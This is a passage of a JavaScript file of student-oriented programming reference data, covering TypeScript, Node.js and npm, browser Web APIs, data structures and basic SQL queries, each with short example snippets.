interface Box<T> {
  value: T;
}

const numBox: Box<number> = { value: 42 };`,
      benefit: 'Reusable code with full type safety.',
    },
    {
      concept: 'Enums',
      description: 'Named constants',
      example: `enum Direction {
  Up = "UP",
  Down = "DOWN",
  Left = "LEFT",
  Right = "RIGHT",
}

let dir: Direction = Direction.Up;`,
      modernAlternative: 'String literal union (often preferred): type Direction = "UP" | "DOWN" | "LEFT" | "RIGHT";',
    },
    {
      concept: 'Functions with types',
      description: 'Type parameters and return values',
      example: `function add(a: number, b: number): number {
  return a + b;
}

// Arrow function
const multiply = (a: number, b: number): number => a * b;

// Optional parameter
function greet(name: string, greeting?: string): string {
  return \`\${greeting || "Hello"}, \${name}\`;
}

// Default parameter
function welcome(name: string = "friend"): string {
  return \`Welcome, \${name}\`;
}

// Rest parameters
function sum(...nums: number[]): number {
  return nums.reduce((a, b) => a + b, 0);
}`,
    },
    {
      concept: 'Type assertions',
      description: 'Tell TS you know the type (use sparingly)',
      example: `const input = document.querySelector("#name") as HTMLInputElement;
input.value = "Aaron";  // TS knows it has .value now

// Alternative syntax (not in JSX)
const input2 = <HTMLInputElement>document.querySelector("#name");`,
      WARNING: 'Type assertions disable safety. Wrong type = runtime crash.',
    },
    {
      concept: 'utility types',
      description: 'Built-in type transformations',
      list: [
        { type: 'Partial<T>', does: 'Make all properties optional' },
        { type: 'Required<T>', does: 'Make all properties required' },
        { type: 'Readonly<T>', does: 'Make all properties readonly' },
        { type: 'Pick<T, Keys>', does: 'Keep only specified keys' },
        { type: 'Omit<T, Keys>', does: 'Remove specified keys' },
        { type: 'Record<K, T>', does: 'Object with K keys and T values' },
        { type: 'ReturnType<F>', does: 'Get function return type' },
        { type: 'Parameters<F>', does: 'Get function parameter types' },
      ],
      example: `interface User { id: string; name: string; email: string; }
type UpdateUser = Partial<User>;  // all fields optional
type PublicUser = Omit<User, "email">;  // no email
type ContactInfo = Pick<User, "name" | "email">;`,
    },
    {
      concept: 'tsconfig.json',
      description: 'Configure the TS compiler',
      common: `{
  "compilerOptions": {
    "target": "ES2020",
    "module": "ESNext",
    "strict": true,
    "noImplicitAny": true,
    "noUnusedLocals": true,
    "esModuleInterop": true,
    "skipLibCheck": true,
    "outDir": "./dist",
    "rootDir": "./src"
  },
  "include": ["src/**/*"],
  "exclude": ["node_modules"]
}`,
      tip: 'strict: true enables all strict checks. Start with it on.',
    },
    {
      concept: 'Why TypeScript',
      reasons: [
        'Catches bugs at compile time (typos, wrong types)',
        'Better IDE autocomplete and refactoring',
        'Self-documenting (types are documentation)',
        'Easier to maintain large codebases',
        'Industry standard for serious JS projects',
        'Improves team velocity once everyone knows it',
      ],
      against: [
        'Setup overhead (compile step)',
        'Learning curve for advanced types',
        'Type definitions for libraries can be wrong',
        'Doesn\'t catch ALL bugs (only type-related)',
      ],
      forStudents: 'Start with plain JS. Move to TS when you build something substantial.',
    },
    {
      concept: 'Common pitfalls',
      list: [
        'Using "any" defeats the purpose — use "unknown" + narrowing',
        'Forgetting null checks (use strictNullChecks)',
        'Type assertions hide real bugs',
        'Over-engineering with too-generic types',
        'Not reading errors carefully — TS messages can be long but informative',
      ],
    },
  ];

  // ─── Node.js + npm reference (verbose) ──────────────────────────
  var NODE_REFERENCE = [
    {
      concept: 'What is Node.js?',
      description: 'JavaScript runtime built on Chrome\'s V8 engine. Runs JS outside the browser.',
      uses: ['Web servers', 'CLI tools', 'Build tools', 'Desktop apps (Electron)', 'IoT'],
      install: 'Visit nodejs.org. Or use nvm (Node Version Manager) for multiple versions.',
      versions: 'LTS (long-term support, even-numbered) for production. Current (odd) for new features.',
    },
    {
      concept: 'Running a script',
      example: 'node script.js → runs JS file in Node',
      modes: [
        { mode: 'Script', cmd: 'node script.js', purpose: 'Run a file' },
        { mode: 'REPL', cmd: 'node', purpose: 'Interactive console (like browser DevTools)' },
        { mode: 'One-liner', cmd: 'node -e "console.log(1+1)"', purpose: 'Execute inline code' },
      ],
    },
    {
      concept: 'npm (Node Package Manager)',
      description: 'Default package manager. Installs packages from npmjs.com.',
      commands: [
        { cmd: 'npm init', does: 'Create package.json' },
        { cmd: 'npm init -y', does: 'Create package.json with defaults' },
        { cmd: 'npm install <pkg>', does: 'Install package (saves to dependencies)' },
        { cmd: 'npm install <pkg> --save-dev', does: 'Save as dev dependency' },
        { cmd: 'npm install -g <pkg>', does: 'Install globally (available everywhere)' },
        { cmd: 'npm install', does: 'Install all from package.json' },
        { cmd: 'npm uninstall <pkg>', does: 'Remove package' },
        { cmd: 'npm update', does: 'Update to latest within semver range' },
        { cmd: 'npm outdated', does: 'Show packages with newer versions' },
        { cmd: 'npm audit', does: 'Check for known vulnerabilities' },
        { cmd: 'npm audit fix', does: 'Auto-fix vulnerabilities (where possible)' },
        { cmd: 'npm run <script>', does: 'Run package.json script' },
        { cmd: 'npm test', does: 'Run "test" script' },
        { cmd: 'npm start', does: 'Run "start" script' },
        { cmd: 'npx <pkg>', does: 'Run package without installing globally' },
      ],
    },
    {
      concept: 'package.json',
      description: 'The manifest for your project',
      example: `{
  "name": "my-project",
  "version": "1.0.0",
  "description": "A cool project",
  "main": "index.js",
  "type": "module",
  "scripts": {
    "start": "node index.js",
    "dev": "node --watch index.js",
    "test": "jest",
    "build": "esbuild src/index.js --bundle --outfile=dist/bundle.js"
  },
  "dependencies": {
    "express": "^4.18.0"
  },
  "devDependencies": {
    "jest": "^29.0.0"
  },
  "engines": {
    "node": ">=18"
  }
}`,
      tip: '"type": "module" enables ES module syntax (import/export). Without it, you need .mjs or use require().',
    },
    {
      concept: 'Semver (semantic versioning)',
      format: 'MAJOR.MINOR.PATCH (e.g., 4.18.0)',
      meaning: [
        'MAJOR: Breaking changes (4.0.0 → 5.0.0)',
        'MINOR: New features, backwards compatible (4.18.0 → 4.19.0)',
        'PATCH: Bug fixes (4.18.0 → 4.18.1)',
      ],
      ranges: [
        { spec: '^4.18.0', means: 'Updates within major (4.x.x) — RECOMMENDED' },
        { spec: '~4.18.0', means: 'Updates within minor (4.18.x)' },
        { spec: '4.18.0', means: 'Exact version only' },
        { spec: '*', means: 'Any version (dangerous)' },
        { spec: '>=4.0.0', means: 'At least 4.0.0' },
      ],
    },
    {
      concept: 'Built-in modules',
      list: [
        { module: 'fs', purpose: 'File system (read, write, watch)' },
        { module: 'path', purpose: 'Path manipulation (join, dirname, etc.)' },
        { module: 'http / https', purpose: 'Create HTTP servers and clients' },
        { module: 'os', purpose: 'Operating system info (platform, cpus, memory)' },
        { module: 'crypto', purpose: 'Cryptography (hashing, encryption)' },
        { module: 'url', purpose: 'URL parsing' },
        { module: 'events', purpose: 'EventEmitter for custom events' },
        { module: 'stream', purpose: 'Streaming data' },
        { module: 'child_process', purpose: 'Spawn other processes' },
        { module: 'process', purpose: 'Current process info (env, argv, exit)' },
        { module: 'util', purpose: 'Utilities (promisify, types)' },
        { module: 'readline', purpose: 'Read input line by line' },
      ],
      modern: 'Built-ins prefixed with node: for clarity: import fs from "node:fs"',
    },
    {
      concept: 'Reading and writing files',
      example: `import fs from 'node:fs/promises';

// Read text file
const text = await fs.readFile('input.txt', 'utf-8');

// Write text file
await fs.writeFile('output.txt', 'Hello!');

// Append to file
await fs.appendFile('log.txt', 'New entry\\n');

// Check if exists
try {
  await fs.access('file.txt');
  console.log('exists');
} catch {
  console.log('does not exist');
}

// List directory
const files = await fs.readdir('./src');

// Delete file
await fs.unlink('temp.txt');

// Make directory
await fs.mkdir('newdir', { recursive: true });`,
    },
    {
      concept: 'Environment variables',
      description: 'Configuration outside code (especially secrets)',
      example: `// Read env var
const apiKey = process.env.API_KEY;
const port = process.env.PORT || 3000;

// Set via .env file (with dotenv package)
// .env contents:
// API_KEY=secret123
// PORT=4000

import 'dotenv/config';  // loads .env into process.env
console.log(process.env.API_KEY);`,
      security: 'NEVER commit .env files. Add to .gitignore.',
    },
    {
      concept: 'process.argv',
      description: 'Command-line arguments',
      example: `// Run: node script.js hello world
// process.argv = ['node', 'script.js', 'hello', 'world']

const [, , ...args] = process.argv;
console.log(args);  // ['hello', 'world']

// Better: use a CLI library like commander or yargs`,
    },
    {
      concept: 'Simple HTTP server',
      example: `import http from 'node:http';

const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Hello, World!');
});

server.listen(3000, () => {
  console.log('Server running on port 3000');
});`,
      modern: 'Most use Express or Fastify instead of bare http.',
    },
    {
      concept: 'Express.js (popular web framework)',
      example: `import express from 'express';
const app = express();

app.use(express.json());

app.get('/', (req, res) => {
  res.send('Hello!');
});

app.post('/api/data', (req, res) => {
  console.log(req.body);
  res.json({ ok: true });
});

app.listen(3000);`,
      install: 'npm install express',
      alternatives: 'Fastify (faster), Koa (newer style), Hono (modern edge-ready)',
    },
    {
      concept: 'Async patterns in Node',
      patterns: [
        { name: 'Callbacks', when: 'Old Node APIs', example: 'fs.readFile("file", (err, data) => {...})' },
        { name: 'Promises', when: 'Modern Node (.promises namespace)', example: 'fs.promises.readFile("file")' },
        { name: 'async/await', when: 'Modern, preferred', example: 'const data = await fs.readFile("file")' },
        { name: 'Streams', when: 'Large files', example: 'fs.createReadStream("file").pipe(transform).pipe(output)' },
      ],
    },
    {
      concept: 'Common Node.js libraries',
      list: [
        { name: 'express', purpose: 'Web framework' },
        { name: 'axios', purpose: 'HTTP client (cleaner than fetch in Node)' },
        { name: 'lodash', purpose: 'Utility functions (deep clone, debounce, etc.)' },
        { name: 'dayjs / date-fns', purpose: 'Date manipulation' },
        { name: 'zod', purpose: 'Schema validation (TS-friendly)' },
        { name: 'dotenv', purpose: 'Load .env files' },
        { name: 'nodemon', purpose: 'Auto-restart on file change (dev)' },
        { name: 'jest / vitest', purpose: 'Testing' },
        { name: 'pino', purpose: 'Logging' },
        { name: 'commander / yargs', purpose: 'Build CLIs' },
        { name: 'cheerio', purpose: 'jQuery-like HTML parsing (server-side)' },
        { name: 'sharp', purpose: 'Image processing' },
        { name: 'puppeteer / playwright', purpose: 'Browser automation' },
      ],
    },
    {
      concept: 'Alternative runtimes',
      list: [
        { runtime: 'Deno', diff: 'Same V8 engine but TypeScript-first, secure by default (sandboxed)' },
        { runtime: 'Bun', diff: 'Faster, built-in bundler/transpiler/test runner. Drop-in replacement for Node mostly' },
      ],
    },
    {
      concept: 'Tips for students',
      tips: [
        'Start by running JS files with node',
        'Then make a simple HTTP server (no framework)',
        'Then try Express for routing',
        'npm scripts let you avoid memorizing long commands',
        'Read errors carefully — Node stack traces are detailed',
        'Use console.log liberally while learning',
        'Use the built-in --watch flag for auto-restart (Node 18+)',
        'Pin versions in package.json (use lockfile)',
      ],
    },
  ];

  // ─── Web APIs reference (verbose) ───────────────────────────────
  var WEB_APIS_REFERENCE = [
    {
      api: 'fetch API',
      description: 'Make HTTP requests from JavaScript',
      example: `// Basic GET
const response = await fetch('https://api.example.com/data');
const data = await response.json();
console.log(data);

// POST with JSON
const result = await fetch('https://api.example.com/save', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'Aaron' }),
});

// Check status
if (!response.ok) {
  throw new Error(\`HTTP \${response.status}\`);
}

// Other body types
await fetch(url, { method: 'POST', body: formData });  // FormData
await fetch(url, { method: 'POST', body: 'plain text' });`,
      gotchas: ['response.ok is true for 200-299, false for 4xx/5xx', 'Errors only thrown on network failure, not HTTP errors', 'Need to call .json() / .text() / .blob() to get body'],
    },
    {
      api: 'localStorage',
      description: 'Persistent key-value storage (per-origin)',
      example: `// Save
localStorage.setItem('username', 'Aaron');
localStorage.setItem('settings', JSON.stringify({ theme: 'dark' }));

// Read
const name = localStorage.getItem('username');
const settings = JSON.parse(localStorage.getItem('settings') || '{}');

// Remove
localStorage.removeItem('username');

// Clear all
localStorage.clear();

// Iterate
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  console.log(key, localStorage.getItem(key));
}`,
      limits: '~5-10MB per origin, strings only (use JSON for objects), synchronous (can block)',
      vs: 'sessionStorage: same API but cleared when tab closes',
    },
    {
      api: 'IndexedDB',
      description: 'Client-side database (for larger data)',
      whenToUse: 'When localStorage isn\'t enough (>10MB, complex queries, binary data)',
      example: `// Open database
const request = indexedDB.open('myDB', 1);
request.onupgradeneeded = (event) => {
  const db = event.target.result;
  const store = db.createObjectStore('students', { keyPath: 'id' });
  store.createIndex('name', 'name', { unique: false });
};

request.onsuccess = (event) => {
  const db = event.target.result;
  const tx = db.transaction('students', 'readwrite');
  tx.objectStore('students').add({ id: 1, name: 'Aaron' });
};`,
      modernHelpers: 'idb library (Jake Archibald) makes it Promise-based',
    },
    {
      api: 'Geolocation',
      description: 'Get user\'s location (requires permission)',
      example: `navigator.geolocation.getCurrentPosition(
  (position) => {
    console.log(position.coords.latitude, position.coords.longitude);
  },
  (error) => {
    console.error('Permission denied or error:', error);
  },
  { enableHighAccuracy: true, timeout: 5000 }
);

// Watch for changes
const watchId = navigator.geolocation.watchPosition(...);
navigator.geolocation.clearWatch(watchId);`,
      privacy: 'Always explain to user why you need their location before requesting.',
    },
    {
      api: 'Notifications',
      description: 'Show desktop notifications',
      example: `// Request permission
const permission = await Notification.requestPermission();

if (permission === 'granted') {
  new Notification('Hello!', {
    body: 'You have a new message',
    icon: '/icon.png',
    badge: '/badge.png',
  });
}`,
      etiquette: 'Don\'t ask immediately on page load. Wait for user action. Don\'t spam.',
    },
    {
      api: 'Clipboard',
      description: 'Read and write the clipboard',
      example: `// Write text
await navigator.clipboard.writeText('Hello!');

// Read text
const text = await navigator.clipboard.readText();

// Write image (Blob)
await navigator.clipboard.write([
  new ClipboardItem({ 'image/png': imageBlob }),
]);`,
      security: 'Requires HTTPS. Read requires user permission.',
    },
    {
      api: 'Web Share',
      description: 'Native share dialog (mobile especially)',
      example: `if (navigator.share) {
  try {
    await navigator.share({
      title: 'My App',
      text: 'Check this out',
      url: 'https://example.com',
    });
  } catch (err) {
    console.log('Share cancelled or failed');
  }
}`,
      support: 'Mobile browsers and Edge/Safari desktop. Use feature detection.',
    },
    {
      api: 'Intersection Observer',
      description: 'Detect when element enters/exits viewport',
      example: `const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      entry.target.classList.add('visible');
    }
  });
}, { threshold: 0.5 });

document.querySelectorAll('.lazy').forEach(el => observer.observe(el));`,
      useCases: ['Lazy load images', 'Infinite scroll', 'Reveal-on-scroll animations', 'Track ad visibility'],
    },
    {
      api: 'MutationObserver',
      description: 'Detect changes to DOM',
      example: `const observer = new MutationObserver((mutations) => {
  mutations.forEach(mutation => {
    console.log(mutation.type, mutation.target);
  });
});

observer.observe(document.body, {
  childList: true,
  subtree: true,
  attributes: true,
});`,
    },
    {
      api: 'ResizeObserver',
      description: 'Detect element size changes (better than window.resize)',
      example: `const observer = new ResizeObserver((entries) => {
  entries.forEach(entry => {
    console.log(entry.contentRect.width, entry.contentRect.height);
  });
});

observer.observe(document.querySelector('.my-element'));`,
    },
    {
      api: 'WebSockets',
      description: 'Two-way real-time communication',
      example: `const socket = new WebSocket('wss://api.example.com/socket');

socket.onopen = () => {
  console.log('Connected');
  socket.send(JSON.stringify({ type: 'hello' }));
};

socket.onmessage = (event) => {
  const data = JSON.parse(event.data);
  console.log('Received:', data);
};

socket.onclose = () => console.log('Disconnected');
socket.onerror = (err) => console.error(err);`,
      useCases: ['Chat apps', 'Live game state', 'Real-time dashboards'],
    },
    {
      api: 'Web Workers',
      description: 'Run code in background thread (don\'t block UI)',
      example: `// main.js
const worker = new Worker('worker.js');
worker.postMessage({ data: bigArray });
worker.onmessage = (e) => console.log('Got result:', e.data);

// worker.js
self.onmessage = (e) => {
  const result = heavyComputation(e.data.data);
  self.postMessage(result);
};`,
      useCases: ['Heavy computation', 'Image/video processing', 'Anything > 50ms'],
    },
    {
      api: 'Service Workers',
      description: 'Background script for offline, push notifications, caching',
      example: `// Register
navigator.serviceWorker.register('/sw.js');

// sw.js
self.addEventListener('install', (e) => {
  e.waitUntil(
    caches.open('v1').then(cache => cache.addAll([
      '/', '/style.css', '/script.js'
    ]))
  );
});

self.addEventListener('fetch', (e) => {
  e.respondWith(
    caches.match(e.request).then(r => r || fetch(e.request))
  );
});`,
      useCases: ['PWAs (offline support)', 'Push notifications', 'Background sync'],
    },
    {
      api: 'getUserMedia (camera/mic)',
      description: 'Access camera and microphone',
      example: `try {
  const stream = await navigator.mediaDevices.getUserMedia({
    video: true,
    audio: true,
  });

  document.querySelector('video').srcObject = stream;

  // Stop later
  stream.getTracks().forEach(t => t.stop());
} catch (err) {
  console.error('Permission denied:', err);
}`,
      privacy: 'Requires HTTPS and user permission. Always show a clear indicator when active.',
    },
    {
      api: 'Speech Recognition',
      description: 'Voice input',
      example: `const recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
recognition.continuous = false;
recognition.lang = 'en-US';

recognition.onresult = (event) => {
  const transcript = event.results[0][0].transcript;
  console.log('You said:', transcript);
};

recognition.start();`,
      support: 'Chrome/Edge mainly. Use feature detection.',
    },
    {
      api: 'Speech Synthesis',
      description: 'Text to speech',
      example: `const utterance = new SpeechSynthesisUtterance('Hello, world!');
utterance.lang = 'en-US';
utterance.rate = 1.0;
utterance.pitch = 1.0;
utterance.volume = 1.0;
speechSynthesis.speak(utterance);

// List available voices
const voices = speechSynthesis.getVoices();`,
      uses: ['Accessibility', 'Reading apps', 'Game NPCs'],
    },
    {
      api: 'History API',
      description: 'Manipulate browser history (for SPAs)',
      example: `// Add to history
history.pushState({ page: 'home' }, '', '/home');

// Replace current
history.replaceState({ page: 'about' }, '', '/about');

// Listen for back/forward
window.addEventListener('popstate', (e) => {
  console.log('Navigated to', e.state);
});

// Go back/forward programmatically
history.back();
history.forward();
history.go(-2);`,
    },
    {
      api: 'URLSearchParams',
      description: 'Parse and build query strings',
      example: `// Parse
const params = new URLSearchParams(window.location.search);
const id = params.get('id');
const tags = params.getAll('tag');  // multiple values

// Build
const params = new URLSearchParams({ q: 'cats', page: 2 });
const url = \`/search?\${params}\`;  // /search?q=cats&page=2

// Modify
params.set('page', 3);
params.append('tag', 'kittens');
params.delete('q');`,
    },
    {
      api: 'Canvas 2D',
      description: 'Draw 2D graphics',
      example: `const canvas = document.querySelector('canvas');
const ctx = canvas.getContext('2d');

ctx.fillStyle = 'red';
ctx.fillRect(10, 10, 100, 100);

ctx.beginPath();
ctx.arc(200, 200, 50, 0, Math.PI * 2);
ctx.fill();

ctx.font = '24px sans-serif';
ctx.fillText('Hello', 50, 250);

// Get image data
const data = ctx.getImageData(0, 0, 100, 100);`,
    },
    {
      api: 'Drag and Drop',
      description: 'Native drag and drop',
      example: `// Source
draggable.addEventListener('dragstart', (e) => {
  e.dataTransfer.setData('text/plain', 'my-id');
});

// Target
dropzone.addEventListener('dragover', (e) => {
  e.preventDefault();  // required to allow drop
});

dropzone.addEventListener('drop', (e) => {
  e.preventDefault();
  const id = e.dataTransfer.getData('text/plain');
  console.log('Dropped:', id);
});

// File drop
dropzone.addEventListener('drop', (e) => {
  e.preventDefault();
  const files = e.dataTransfer.files;
  console.log('Files dropped:', files);
});`,
    },
    {
      api: 'Performance API',
      description: 'Measure performance precisely',
      example: `// Mark and measure
performance.mark('startTask');
doWork();
performance.mark('endTask');
performance.measure('Task duration', 'startTask', 'endTask');

const entries = performance.getEntriesByName('Task duration');
console.log(entries[0].duration);

// High-resolution time
const start = performance.now();
doWork();
const elapsed = performance.now() - start;`,
    },
  ];

  // ─── Data structures (verbose) ──────────────────────────────────
  var DATA_STRUCTURES = [
    {
      name: 'Array',
      description: 'Ordered collection, indexed by number',
      operations: {
        access: 'O(1) — direct index lookup',
        search: 'O(n) — linear scan unless sorted',
        insert: 'O(n) — shift elements (O(1) at end)',
        delete: 'O(n) — shift elements (O(1) at end)',
      },
      whenToUse: 'Need ordered list, frequent index access, fixed or small size',
      example: `const fruits = ['apple', 'banana', 'cherry'];
fruits.push('date');  // add to end
fruits.pop();  // remove from end
fruits.unshift('elderberry');  // add to start (slow!)
fruits.shift();  // remove from start (slow!)
fruits.indexOf('banana');  // 1
fruits[0];  // 'apple'`,
      jsTip: 'JS arrays are dynamic — they grow automatically.',
    },
    {
      name: 'Linked List',
      description: 'Each node points to the next',
      operations: {
        access: 'O(n) — must traverse from head',
        search: 'O(n)',
        insert: 'O(1) at head, O(n) elsewhere',
        delete: 'O(1) at head, O(n) elsewhere',
      },
      whenToUse: 'Frequent insertion/deletion at start, unknown size',
      types: ['Singly linked', 'Doubly linked (back pointer too)', 'Circular (last → first)'],
      example: `class Node {
  constructor(value) {
    this.value = value;
    this.next = null;
  }
}

class LinkedList {
  constructor() { this.head = null; }

  prepend(value) {
    const node = new Node(value);
    node.next = this.head;
    this.head = node;
  }
}`,
      reality: 'Modern hardware makes arrays usually faster due to cache locality. LL is mainly academic.',
    },
    {
      name: 'Stack',
      description: 'LIFO (Last In, First Out)',
      operations: {
        push: 'O(1) — add to top',
        pop: 'O(1) — remove from top',
        peek: 'O(1) — see top',
      },
      whenToUse: 'Undo/redo, function call stack, parsing, backtracking',
      example: `class Stack {
  constructor() { this.items = []; }
  push(item) { this.items.push(item); }
  pop() { return this.items.pop(); }
  peek() { return this.items[this.items.length - 1]; }
  isEmpty() { return this.items.length === 0; }
}`,
      reallife: 'Browser back button is a stack. Ctrl+Z undo is a stack.',
    },
    {
      name: 'Queue',
      description: 'FIFO (First In, First Out)',
      operations: {
        enqueue: 'O(1) — add to back',
        dequeue: 'O(1) with proper implementation, O(n) with naive array shift',
      },
      whenToUse: 'Task scheduling, BFS, message queues, print spooler',
      example: `class Queue {
  constructor() { this.items = []; }
  enqueue(item) { this.items.push(item); }
  dequeue() { return this.items.shift(); }  // O(n) — see below
  peek() { return this.items[0]; }
}

// For O(1) dequeue, use two stacks or a circular buffer`,
      types: ['Standard queue', 'Priority queue (sorted)', 'Double-ended queue (deque)', 'Circular queue'],
    },
    {
      name: 'Hash Map / Object',
      description: 'Key → value mapping using hash function',
      operations: {
        access: 'O(1) average, O(n) worst',
        search: 'O(1) average',
        insert: 'O(1) average',
        delete: 'O(1) average',
      },
      whenToUse: 'Lookups by key, caching, counting frequencies, deduplication',
      example: `// JS objects
const wordCount = {};
for (const word of text.split(' ')) {
  wordCount[word] = (wordCount[word] || 0) + 1;
}

// Or Map (preferred for non-string keys)
const map = new Map();
map.set('key', 'value');
map.get('key');
map.has('key');
map.delete('key');
map.size;`,
      objectVsMap: 'Map: any key type, preserves order, has .size. Object: string keys only, prototype pollution risk.',
    },
    {
      name: 'Hash Set / Set',
      description: 'Collection of unique values',
      operations: {
        add: 'O(1) average',
        has: 'O(1) average',
        delete: 'O(1) average',
      },
      whenToUse: 'Track membership, remove duplicates, set operations',
      example: `const set = new Set([1, 2, 2, 3]);
console.log(set.size);  // 3 (duplicates removed)
set.add(4);
set.has(2);  // true
set.delete(1);

// Deduplicate array
const unique = [...new Set(arr)];

// Set operations
const intersection = new Set([...a].filter(x => b.has(x)));`,
    },
    {
      name: 'Binary Tree',
      description: 'Each node has up to 2 children (left, right)',
      operations: {
        access: 'O(log n) balanced, O(n) worst (skewed)',
        search: 'O(log n) for BST, balanced',
        insert: 'O(log n) average',
        delete: 'O(log n) average',
      },
      whenToUse: 'Hierarchical data, sorted data with frequent insertion',
      types: ['Binary Search Tree (BST)', 'AVL tree (self-balancing)', 'Red-Black tree (used in JS Maps)', 'Heap (priority queue)'],
      example: `class TreeNode {
  constructor(value) {
    this.value = value;
    this.left = null;
    this.right = null;
  }
}

function insert(root, value) {
  if (!root) return new TreeNode(value);
  if (value < root.value) root.left = insert(root.left, value);
  else root.right = insert(root.right, value);
  return root;
}`,
    },
    {
      name: 'Heap',
      description: 'Binary tree where parent ≥ (or ≤) children',
      operations: {
        peek: 'O(1) — root is max/min',
        insert: 'O(log n)',
        extract: 'O(log n)',
      },
      whenToUse: 'Priority queue, top-K problems, scheduling',
      types: ['Max-heap (root = max)', 'Min-heap (root = min)'],
      example: 'Often implemented as array. Parent of i is at (i-1)/2, children at 2i+1 and 2i+2.',
      useCase: 'Dijkstra\'s shortest path, Huffman coding, OS task scheduler',
    },
    {
      name: 'Graph',
      description: 'Nodes connected by edges',
      types: ['Directed (one-way)', 'Undirected (two-way)', 'Weighted (edges have cost)', 'Cyclic / Acyclic (DAG)'],
      operations: 'Depends on representation (adjacency list/matrix)',
      whenToUse: 'Networks, maps, relationships, dependencies',
      example: `// Adjacency list
const graph = {
  A: ['B', 'C'],
  B: ['A', 'D'],
  C: ['A', 'D'],
  D: ['B', 'C'],
};

// BFS
function bfs(start) {
  const visited = new Set([start]);
  const queue = [start];
  while (queue.length) {
    const node = queue.shift();
    for (const neighbor of graph[node]) {
      if (!visited.has(neighbor)) {
        visited.add(neighbor);
        queue.push(neighbor);
      }
    }
  }
  return visited;
}`,
      algorithms: ['BFS (shortest path unweighted)', 'DFS (path exists)', 'Dijkstra (shortest path weighted)', 'A* (heuristic search)', 'Topological sort (DAG ordering)'],
    },
    {
      name: 'Trie (prefix tree)',
      description: 'Tree where path from root spells a word',
      operations: {
        insert: 'O(m) where m is word length',
        search: 'O(m)',
        prefixMatch: 'O(m) for prefix, then traverse subtree',
      },
      whenToUse: 'Autocomplete, spell check, IP routing, dictionary',
      example: `class TrieNode {
  constructor() {
    this.children = {};
    this.isEnd = false;
  }
}

function insert(root, word) {
  let node = root;
  for (const c of word) {
    if (!node.children[c]) node.children[c] = new TrieNode();
    node = node.children[c];
  }
  node.isEnd = true;
}`,
    },
    {
      name: 'Bloom Filter',
      description: 'Probabilistic structure for "definitely not in set" or "maybe in set"',
      operations: {
        add: 'O(k) for k hash functions',
        contains: 'O(k)',
      },
      whenToUse: 'Cache filters, spam filters, NoSQL DB queries — when memory matters and false positives are OK',
      tradeoff: 'May report false positives (says yes when no), never false negatives (no means no)',
      uses: ['Bitcoin SPV nodes', 'CDN cache filters', 'Web crawlers (visited?)'],
    },
    {
      name: 'LRU Cache',
      description: 'Least-Recently-Used cache (drops oldest unused)',
      operations: {
        get: 'O(1)',
        put: 'O(1)',
      },
      implementation: 'HashMap + doubly linked list',
      whenToUse: 'Memory-limited caches, OS page replacement',
      jsTip: 'JS Map preserves insertion order — useful for simple LRU.',
    },
    {
      name: 'Choosing a data structure',
      questions: [
        'Need random access by index? → Array',
        'Frequent add/remove from front? → Linked list or proper Queue',
        'LIFO (most recent first)? → Stack',
        'FIFO (oldest first)? → Queue',
        'Lookup by key? → Hash map (Object/Map)',
        'Unique items + membership check? → Set',
        'Sorted data, frequent insertion? → BST or sorted array',
        'Top K / priority? → Heap',
        'Hierarchical/nested? → Tree',
        'Network/relationships? → Graph',
        'Prefix matching? → Trie',
        'Memory-limited membership? → Bloom filter',
      ],
    },
  ];

  // ─── SQL reference (verbose) ────────────────────────────────────
  var SQL_REFERENCE = [
    {
      category: 'SELECT basics',
      examples: [
        { query: 'SELECT * FROM students;', does: 'All columns from students table' },
        { query: 'SELECT name, age FROM students;', does: 'Only name and age columns' },
        { query: 'SELECT DISTINCT grade FROM students;', does: 'Unique grade values' },
        { query: 'SELECT COUNT(*) FROM students;', does: 'Count all rows' },
        { query: 'SELECT name FROM students LIMIT 10;', does: 'First 10 rows' },
        { query: 'SELECT name FROM students LIMIT 10 OFFSET 20;', does: 'Skip 20, take 10 (pagination)' },
      ],
    },
    {
      category: 'WHERE filtering',
      examples: [
        { query: 'SELECT * FROM students WHERE age > 13;', does: 'Older than 13' },
        { query: 'SELECT * FROM students WHERE grade = 8;', does: 'Exact match' },
        { query: "SELECT * FROM students WHERE name LIKE 'A%';", does: 'Names starting with A' },
        { query: 'SELECT * FROM students WHERE age BETWEEN 13 AND 15;', does: 'Range (inclusive)' },
        { query: 'SELECT * FROM students WHERE grade IN (7, 8, 9);', does: 'Multiple values' },
        { query: 'SELECT * FROM students WHERE email IS NULL;', does: 'Missing email' },
        { query: 'SELECT * FROM students WHERE email IS NOT NULL;', does: 'Has email' },
      ],
      operators: ['= equal', '!= or <> not equal', '<, >, <=, >=', 'AND, OR, NOT', 'LIKE (pattern: % any, _ one char)'],
    },
    {
      category: 'ORDER BY',
      examples: [
        { query: 'SELECT * FROM students ORDER BY age;', does: 'Ascending by age (default)' },
        { query: 'SELECT * FROM students ORDER BY age DESC;', does: 'Descending' },
        { query: 'SELECT * FROM students ORDER BY grade DESC, age ASC;', does: 'Multi-column sort' },
      ],
    },
    {
      category: 'GROUP BY + aggregates',
      examples: [
        { query: 'SELECT grade, COUNT(*) FROM students GROUP BY grade;', does: 'Count per grade' },
        { query: 'SELECT grade, AVG(age) FROM students GROUP BY grade;', does: 'Average age per grade' },
        { query: 'SELECT grade, MAX(score) FROM tests GROUP BY grade;', does: 'Highest score per grade' },
        { query: 'SELECT grade, COUNT(*) FROM students GROUP BY grade HAVING COUNT(*) > 10;', does: 'Grades with more than 10 students' },
      ],
      aggregates: ['COUNT', 'SUM', 'AVG', 'MIN', 'MAX', 'GROUP_CONCAT (or STRING_AGG)'],
      note: 'WHERE filters rows before grouping. HAVING filters groups after.',
    },
    {
      category: 'JOIN',
      examples: [
        { query: 'SELECT s.name, t.score FROM students s JOIN tests t ON s.id = t.student_id;', does: 'INNER JOIN — only matching rows' },
        { query: 'SELECT s.name, t.score FROM students s LEFT JOIN tests t ON s.id = t.student_id;', does: 'All students, with test scores if any' },
        { query: 'SELECT s.name, t.score FROM students s RIGHT JOIN tests t ON s.id = t.student_id;', does: 'All tests, with student name if any' },
      ],
      types: [
        { type: 'INNER JOIN', does: 'Only rows that match in both tables' },
        { type: 'LEFT JOIN', does: 'All from left table + matches from right' },
        { type: 'RIGHT JOIN', does: 'All from right table + matches from left' },
